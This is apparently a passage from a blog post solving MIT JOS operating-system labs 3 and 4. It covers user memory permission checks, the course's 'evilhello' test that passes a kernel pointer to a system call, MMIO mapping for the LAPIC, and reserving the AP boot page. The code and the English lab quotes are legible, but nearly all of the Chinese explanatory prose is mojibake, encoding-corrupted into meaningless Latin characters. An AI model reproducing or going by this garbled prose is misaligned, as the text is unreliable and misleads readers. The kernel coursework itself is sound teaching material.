class="line">&#123;</span><br><span class="line">pte = pgdir_walk(env-&gt;env_pgdir, (<span class="type">void</span>*)start, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((!pte) || (start &gt;= ULIM) || !(*pte &amp; PTE_P) || ((*pte &amp; perm) != perm))</span><br><span class="line">&#123;</span><br><span class="line">user_mem_check_addr =  (start &lt; (<span class="type">uint32_t</span>)va ? (<span class="type">uint32_t</span>)va : start);</span><br><span class="line"><span class="keyword">return</span> -E_FAULT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ä¿®æ”¹ <code>debuginfo_eip()</code>ï¼Œåœ¨ <code>usd</code>, <code>stabs</code>, <code>stabstr</code> è¿™ä¸‰ä¸ªåœ°æ–¹åŠ ä¸Š <code>user_mem_check()</code> è¿›è¡Œåœ°å€åˆæ³•æ€§æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure this memory is valid.</span></span><br><span class="line"><span class="comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)usd, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> UserStabData), PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">stabs = usd-&gt;stabs;</span><br><span class="line">stab_end = usd-&gt;stab_end;</span><br><span class="line">stabstr = usd-&gt;stabstr;</span><br><span class="line">stabstr_end = usd-&gt;stabstr_end;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure the STABS and string table memory is valid.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)stabs, stab_end - stabs, PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)stabstr, stabstr_end - stabstr, PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ Exercise 10ï¼Œé˜²æ­¢ evilhello å¯¼è‡´ kernel panic</p><blockquote><p><strong>Exercise 10.</strong> Boot your kernel, running <code>user/evilhello</code>. The environment should be destroyed, and the kernel should not panic. You should see:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[00000000] new env 00001000</span><br><span class="line">...</span><br><span class="line">[00001000] user_mem_check assertion failure for va f010000c</span><br><span class="line">[00001000] free env 00001000</span><br></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ <code>user/evilhello.c</code> ï¼Œé‡Œé¢ä¸ºç³»ç»Ÿè°ƒç”¨ <code>sys_cputs()</code> ä¼ é€’äº†ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸­çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil hello world -- kernel pointer passed to kernel</span></span><br><span class="line"><span class="comment">// kernel should destroy user environment in response</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inc/lib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">umain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// try to print the kernel entry point as a string!  mua ha ha!</span></span><br><span class="line">sys_cputs((<span class="type">char</span>*)<span class="number">0xf010000c</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨å¯¹åº”ç³»ç»Ÿè°ƒç”¨åŠ ä¸Šåœ°å€åˆæ³•æ€§æ£€æŸ¥å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Print a string to the system console.</span></span><br><span class="line"><span class="comment">// The string is exactly &#x27;len&#x27; characters long.</span></span><br><span class="line"><span class="comment">// Destroys the environment on memory errors.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">sys_cputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check that the user has permission to read memory [s, s+len).</span></span><br><span class="line"><span class="comment">// Destroy the environment if not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">user_mem_assert(curenv, s, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print the string supplied by the user.</span></span><br><span class="line">cprintf(<span class="string">&quot;%.*s&quot;</span>, len, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯„åˆ†ç¨‹åºï¼Œæˆ‘ä»¬æˆåŠŸé€šè¿‡äº†æ‰€æœ‰æµ‹è¯•ï¼Œæ‹¿åˆ°æ»¡åˆ†</p><p><img src="https://s2.loli.net/2022/03/17/Xo6q4wWvFJptYzl.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œ lab3 å…¨éƒ¨å®Œæˆ</p><h1 id="0x04-Lab-4-Preemptive-Multitasking"><a href="#0x04-Lab-4-Preemptive-Multitasking" class="headerlink" title="0x04. Lab 4: Preemptive Multitasking"></a>0x04. Lab 4: Preemptive Multitasking</h1><p>åœ¨ lab4 ä¸­æˆ‘ä»¬å°†å®ç°æŠ¢å å¼å¤šä»»åŠ¡è°ƒåº¦</p><p>é¦–å…ˆè¿˜æ˜¯å…ˆ commit lab3 çš„ä»£ç ï¼ŒæŠŠ lab4 åˆ†æ”¯æ‹‰ä¸‹æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;lab3&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab4 origin/lab4</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge lab3</span></span><br></pre></td></tr></table></figure><p>åœ¨ lab4 å½“ä¸­æ–°å¢äº†å¦‚ä¸‹æ–‡ä»¶ï¼š</p><table><thead><tr><th><code>kern/cpu.h</code></th><th>Kernel-private definitions for multiprocessor support</th></tr></thead><tbody><tr><td><code>kern/mpconfig.c</code></td><td>Code to read the multiprocessor configuration</td></tr><tr><td><code>kern/lapic.c</code></td><td>Kernel code driving the local APIC unit in each processor</td></tr><tr><td><code>kern/mpentry.S</code></td><td>Assembly-language entry code for non-boot CPUs</td></tr><tr><td><code>kern/spinlock.h</code></td><td>Kernel-private definitions for spin locks, including the big kernel lock</td></tr><tr><td><code>kern/spinlock.c</code></td><td>Kernel code implementing spin locks</td></tr><tr><td><code>kern/sched.c</code></td><td>Code skeleton of the scheduler that you are about to implement</td></tr></tbody></table><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>åœ¨æœ¬ lab çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†æ‰©å±• JOS ä»¥è®©å…¶èƒ½è¿è¡Œåœ¨ä¸€ä¸ªå¤šå¤„ç†å™¨ç³»ç»Ÿä¸Šï¼Œå¹¶å®ç°ä¸€äº›ç³»ç»Ÿè°ƒç”¨ä»¥å…è®¸ç”¨æˆ·çº§çš„è¿›ç¨‹åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼›æˆ‘ä»¬åŒæ—¶è¿˜å°†å®ç° <em>åä½œå¼çš„</em> è½®è¯¢è°ƒåº¦ï¼ˆround-robin schedulingï¼‰ï¼Œå…è®¸å†…æ ¸åœ¨å½“å‰è¿›ç¨‹è‡ªæ„¿æ”¾å¼ƒCPU æ—¶è¿›è¡Œè¿›ç¨‹è°ƒåº¦ï¼›åœ¨ Part C ä¸­æˆ‘ä»¬è¿˜å°†å®ç° <em>æŠ¢å å¼</em> çš„è°ƒåº¦ï¼Œå…¶å…è®¸å†…æ ¸åœ¨ä¸€æ®µæ—¶é—´åé‡æ–°è·å– CPU çš„æ§åˆ¶æƒ</p><h3 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h3><p>æˆ‘ä»¬å°†è®© JOS æ”¯æŒâ€å¯¹ç§°å¼å¤šå¤„ç†â€œï¼ˆsymmetric multiprocessingï¼‰â€”â€”ä¸€ç§æ‰€æœ‰ CPU éƒ½æœ‰å¯¹ç³»ç»Ÿèµ„æºåŒç­‰çš„æƒé™çš„å¤šå¤„ç†å™¨æ¨¡å‹ã€‚åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­ï¼ŒSMP ä¸­çš„ CPU å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç”±ä¸€ä¸ªå¼•å¯¼å¤„ç†å™¨ï¼ˆbootstrap processorï¼ŒBSPï¼‰è´Ÿè´£ç³»ç»Ÿçš„åˆå§‹åŒ–ä¸å¯åŠ¨å·¥ä½œï¼Œå‰©ä½™çš„åº”ç”¨å¤„ç†å™¨ï¼ˆapplication processorsï¼ŒAPsï¼‰åˆ™åœ¨ç³»ç»Ÿè¿è¡Œä¹‹åå†ç”± BSP å”¤é†’ã€‚è€Œç”±å“ªä¸ª CPU æ¥ä½œä¸º BSP åˆ™æ˜¯ç”±ç¡¬ä»¶ä¸ BIOS å†³å®šçš„ã€‚</p><p>åœ¨ SMP ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ª CPU éƒ½é™„å¸¦æœ‰ä¸€ä¸ªæœ¬åœ° APIC ï¼ˆLAPICï¼‰å•å…ƒï¼Œå…¶ä¸ä»…è´Ÿè´£åˆ†å‘ä¸­æ–­ï¼Œè¿˜è´Ÿè´£ä¸ºå…¶è¿æ¥çš„ CPU æä¾›ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œæœ¬æ¬¡å®éªŒæˆ‘ä»¬å°†åˆ©ç”¨ LAPIC å•å…ƒçš„ä¸‹åˆ—åŸºæœ¬åŠŸèƒ½ï¼ˆå‚è§ <code>kern/lapic.c</code>ï¼‰</p><ul><li>è¯»å– LAPIC ID ä»¥è¯†åˆ«ä»£ç å½“å‰è¿è¡Œçš„ CPUï¼ˆå‚è§ <code>cpunum()</code>ï¼‰</li><li>ä» BSP å‘ APs å‘é€ <code>STARTUP</code> è¿™ä¸€å¤„ç†å™¨é—´ä¸­æ–­ï¼ˆinterprocessor interruptï¼‰ä»¥å°†å…¶å”¤é†’ï¼ˆå‚è§ <code>lapic_startap()</code>ï¼‰</li><li>åœ¨ part C ä¸­ï¼Œæˆ‘ä»¬å¯¹ LAPIC çš„å†…ç½®è®¡æ—¶å™¨è¿›è¡Œç¼–ç¨‹ä»¥è§¦å‘æ—¶é’Ÿä¸­æ–­ä»è€Œæ”¯æŒæŠ¢å å¼å¤šä»»åŠ¡ï¼ˆå‚è§ <code>apic_init()</code>ï¼‰</li></ul><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. Youâ€™ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>å¤„ç†å™¨é€šè¿‡ MMIO è®¿é—®å…¶ LAPICï¼šä¸€éƒ¨åˆ†ç‰©ç†å†…å­˜è¢«<strong>ç¡¬è¿çº¿</strong>åˆ°éƒ¨åˆ† IO è®¾å¤‡çš„å¯„å­˜å™¨ä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ™®é€šçš„å­˜å–æŒ‡ä»¤æ¥è®¿é—®è®¾å¤‡å¯„å­˜å™¨ï¼Œç›¸åº”åœ°è¿™å—å†…å­˜ä¾¿æ˜¯ä¸€ä¸ªå†…å­˜ç©ºæ´ã€‚LAPIC å¯¹åº”çš„å†…å­˜ç©ºæ´åˆ™åœ¨<strong>ç‰©ç†åœ°å€</strong> <code>0xFE000000</code> å¤„ï¼Œå ç”¨ 32 MBï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡åŸºäº <code>KERNBASE</code> çš„çº¿æ€§æ˜ å°„è¿›è¡Œè®¿é—®ï¼ˆè¶…å‡º 32 ä½åœ°å€äº†ï¼‰ï¼Œä½† JOS åœ¨ <code>MMIOBASE</code> å¤„ç•™äº† 4MB çš„ç©ºç™½æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ˜ å°„åˆ°æ­¤å¤„</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œè®©æˆ‘ä»¬å®ç° <code>mmio_map_region()</code></p><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. Youâ€™ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>è¿™ä¸ªå‡½æ•°ä¸»è¦çš„ä½œç”¨å°±æ˜¯å°†æŒ‡å®šçš„ç‰©ç†å†…å­˜æ˜ å°„åˆ°å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ä¸Šï¼Œåªä¸è¿‡ç›®æ ‡æ˜¯ mmio å†…å­˜ï¼Œç›´æ¥ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰å†™çš„ <code>boot_map_region()</code> å³å¯ï¼Œä»¥é¡µä¸ºå•ä½ä» <code>MMIOBASE</code> å¼€å§‹æ˜ å°„ï¼Œè‹¥å‰©ä½™çš„ç•™ç»™ MMIO çš„åŒºåŸŸä¸å¤Ÿåˆ™ panicï¼Œè¿™é‡Œåˆ«å¿˜äº†é¡µè¡¨é¡¹æ ‡å¿—ä½åº”è®¾ä¸º <code>PTE_W | PTE_PCD | PTE_PWT</code> ï¼ˆå¯å†™ &amp;&amp; ç¦ç”¨é«˜é€Ÿç¼“å­˜ &amp;&amp; é¡µçº§é€šå†™ä½ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span></span><br><span class="line"><span class="comment">// location.  Return the base of the reserved region.  size does *not*</span></span><br><span class="line"><span class="comment">// have to be multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">mmio_map_region</span><span class="params">(<span class="type">physaddr_t</span> pa, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Where to start the next region.  Initially, this is the</span></span><br><span class="line"><span class="comment">// beginning of the MMIO region.  Because this is static, its</span></span><br><span class="line"><span class="comment">// value will be preserved between calls to mmio_map_region</span></span><br><span class="line"><span class="comment">// (just like nextfree in boot_alloc).</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reserve size bytes of virtual memory starting at base and</span></span><br><span class="line"><span class="comment">// map physical pages [pa,pa+size) to virtual addresses</span></span><br><span class="line"><span class="comment">// [base,base+size).  Since this is device memory and not</span></span><br><span class="line"><span class="comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span></span><br><span class="line"><span class="comment">// safe to cache access to this memory.  Luckily, the page</span></span><br><span class="line"><span class="comment">// tables provide bits for this purpose; simply create the</span></span><br><span class="line"><span class="comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span></span><br><span class="line"><span class="comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span></span><br><span class="line"><span class="comment">// in more details on this, see section 10.5 of IA32 volume</span></span><br><span class="line"><span class="comment">// 3A.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to round size up to a multiple of PGSIZE and to</span></span><br><span class="line"><span class="comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span></span><br><span class="line"><span class="comment">// okay to simply panic if this happens).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The staff solution uses boot_map_region.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line"></span><br><span class="line">size = ROUNDUP(pa + size, PGSIZE);</span><br><span class="line">pa = ROUNDDOWN(pa, PGSIZE);</span><br><span class="line">size -= pa;</span><br><span class="line"><span class="keyword">if</span> ((base + size) &gt; MMIOLIM || (base + size) &lt; MMIOBASE)</span><br><span class="line">panic(<span class="string">&quot;Run out of MMIO region!&quot;</span>);</span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(base - size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap"><a href="#Application-Processor-Bootstrap" class="headerlink" title="Application Processor Bootstrap"></a>Application Processor Bootstrap</h4><p>åœ¨å¯åŠ¨ APs ä¹‹å‰ BSP åº”å½“æ”¶é›†å¤šå¤„ç†å™¨ç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚ CPU æ€»æ•°ã€APIC IDs ä»¥åŠ LAPIC å•å…ƒçš„ MMIO åœ°å€ï¼Œ<code>mp_init()</code> å‡½æ•°é€šè¿‡è¯»å– BIOS çš„å†…å­˜åŒºä¸­çš„ MP é…ç½®è¡¨æ¥è·å–è¿™äº›ä¿¡æ¯ï¼›åœ¨<code>boot_aps()</code> ä¸­å°† APs å¯åŠ¨ï¼ˆå®æ¨¡å¼ï¼‰ï¼Œå¹¶å°† AP å…¥å£ä»£ç æ‹·è´åˆ°ä¸€ä¸ªå®æ¨¡å¼ä¸‹å¯å¯»å€çš„å†…å­˜åŒºåŸŸï¼Œä¸åŒäº bootloaderï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ APs å¼€å§‹æ‰§è¡Œä»£ç çš„ä½ç½®ï¼Œæˆ‘ä»¬å°†å…¥å£ä»£ç å¤åˆ¶åˆ° 0x7000 ï¼ˆ<code>MPENTRY_PADDR</code>ï¼‰å¤„ï¼Œä¸è¿‡å…¶å®ä»»ä½• 640KB ä»¥ä¸‹çš„æœªä½¿ç”¨çš„é¡µå¯¹é½çš„ç‰©ç†åœ°å€éƒ½å¯ä»¥è¢«ä½¿ç”¨</p><p>ä¹‹å <code>boot_aps()</code> é€šè¿‡å‘æ¯ä¸€ä¸ª APs çš„ LAPIC å•å…ƒå‘é€ <code>STARTUP</code> IPI ä»¥å”¤é†’ä»–ä»¬ï¼Œå…¶ä¸­åŒ…å«æœ‰å…¥å£ç‚¹çš„åœ°å€ï¼Œåœ¨ç»è¿‡ç®€å•çš„è®¾ç½®ä¹‹å æ¯ä¸ª AP éƒ½å°†è¿›å…¥å¼€å¯åˆ†é¡µçš„ä¿æŠ¤æ¨¡å¼ï¼Œå¹¶è°ƒç”¨ <code>mp_main()</code> å‡½æ•°ï¼›<code>boot_aps()</code> ä¼šç­‰åˆ°æ¯ä¸ªè¢«å”¤é†’çš„ AP åœ¨è®¾ç½®è‡ªå·±å¯¹åº”çš„ <code>struct CpuInfo</code> ä¸­çš„ <code>cpu_status</code> åŸŸçš„ <code>CPU_STARTED</code> æ ‡å¿—ä½åæ‰ä¼šæ¥ç€å”¤é†’ä¸‹ä¸€ä¸ª</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼Œé˜…è¯»å¯åŠ¨è¿‡ç¨‹çš„ä»£ç å¹¶ä¿®æ”¹ <code>page_init()</code> ä»¥é¿å…å°† <code>MPENTRY_ADDR</code> å¯¹åº”çš„é¡µä¹Ÿé“¾åˆ° freelist ä¸Š</p><blockquote><p><strong>Exercise 2.</strong> Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><p>é¦–å…ˆæ‹œè¯»ä¸€ä¸‹ <code>boot_aps()</code>ï¼Œé€»è¾‘è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸»è¦å°±æ˜¯æ‹·è´å¯åŠ¨ä»£ç åˆ° 0x7000ï¼Œä¹‹åé€šè¿‡ <code>lapic_startap()</code> å”¤é†’å•ä¸ª AP å¹¶è¿›è¡Œå¿™ç­‰å¾…ç›´åˆ°å…¶è®¾ç½®è‡ªå·±çš„ <code>CPU_STARTED</code> æ ‡å¿—ä½ï¼Œè€Œ <code>mp_main()</code> åˆ™ä¸»è¦æ˜¯å°†å†…æ ¸é¡µè¡¨è£…è½½åˆ° AP è‡ªå·±çš„ cr3 ä¸Šï¼Œä»¥åŠåˆå§‹åŒ–è‡ªå·±çš„ç¯å¢ƒã€IDTã€ä»è¿è¡Œé˜Ÿåˆ—ä¸­å–å‡ºè¿›ç¨‹ï¼ˆåé¢è¿™äº›éƒ½éœ€è¦æˆ‘ä»¬åœ¨åç»­å®ç°ï¼‰</p><p>æˆ‘ä»¬ç›´æ¥çœ‹ä¿®æ”¹ <code>page_init()</code>ï¼Œå¦‚æœåœ¨å»º freelist æ—¶å¯¹æ¯ä¸€å¼ å†…å­˜é¡µéƒ½è¿›è¡Œä¸€æ¬¡åˆ¤æ–­é‚£å°±å¤ªè€—æ—¶äº†ï¼Œç¬”è€…çš„é€‰æ‹©æ˜¯ç­‰åˆ° freelist å»ºå®Œä¹‹åå†å°†å¯¹åº”é¡µè¿›è¡Œè„±é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4:</span></span><br><span class="line"><span class="comment">// Change your code to mark the physical page at MPENTRY_PADDR</span></span><br><span class="line"><span class="comment">// as in use</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">mpentry</span>, *<span class="title">mp_prev</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5) mark the physical page at MPENTRY_PADDR as in use</span></span><br><span class="line">mpentry = pa2page(MPENTRY_PADDR);</span><br><span class="line">mp_prev = pa2page(MPENTRY_PADDR + PGSIZE);</span><br><span class="line">mp_prev-&gt;pp_link = mpentry-&gt;pp_link;</span><br><span class="line">mpentry-&gt;pp_ref = <span class="number">1</span>;</span><br><span class="line">mpentry-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¹ é¢˜ï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?<br>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</li></ol></blockquote><p><code>MPBOOTPHYS</code> å®ä¸»è¦çš„ä½œç”¨å°±æ˜¯è®¡ç®— entry code ä¸­éœ€è¦ç”¨åˆ°çš„åœ°å€çš„<strong>çœŸå®ç‰©ç†åœ°å€</strong>ï¼Œå› ä¸º entry code åœ¨è¢«é“¾æ¥è¿›å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶åå…¶åœ°å€ä¸ä¸€å®šæ˜¯ 0x7000 èµ·å§‹ï¼Œä½†æ˜¯æˆ‘ä»¬å°†å…¶åŠ è½½åˆ°äº†è¯¥ä½ç½®ï¼Œå› æ­¤å¯¹äºç»å¯¹åœ°å€çš„ç´¢å¼•éœ€è¦è®¡ç®—å…¶åŠ è½½åˆ°è¯¥åœ°å€ä¸Šä¹‹åçš„åœ°å€</p><h4 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h4><p>å¯¹äºä¸€ä¸ªå¤šå¤„ç†å™¨ OS è€Œè¨€æˆ‘ä»¬å¾ˆæœ‰å¿…è¦ä¸ºæ¯ä¸ª CPU éƒ½åˆ†é…ä¸€å—ç§æœ‰ç©ºé—´ï¼ˆä¾‹å¦‚ Linux ä¸­çš„ percpu å˜é‡ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†é…ä¸€ä¸ªæ•°ç»„å¹¶ä½¿ç”¨ <code>cpunum()</code> è·å–åˆ° CPU æ ‡å·ä½œä¸ºä¸‹æ ‡ç´¢å¼•ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬åº”å½“æ³¨æ„çš„ per-CPU stateï¼š</p><ul><li><p><strong>Per-CPU kernel stack</strong>.</p><p>æ¯ä¸ª CPU éƒ½åº”å½“æœ‰å±äºå…¶è‡ªå·±çš„å †æ ˆï¼Œåœ¨ JOS ä¸­æ•°ç»„ <code>percpu_kstacks[NCPU][KSTKSIZE]</code> ä¸ºæ¯ä¸ª CPU ä¿ç•™ä¸€ä»½è‡ªå·±çš„å †æ ˆåŒºåŸŸï¼›æ­£å¦‚åœ¨ lab2 ä¸­æˆ‘ä»¬å°† BSP çš„å †æ ˆæ˜ å°„åˆ°äº† KSTACKTOP ä¸‹ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä¸ºæ¯ä¸ª CPU åˆ›å»ºè‡ªå·±çš„å †æ 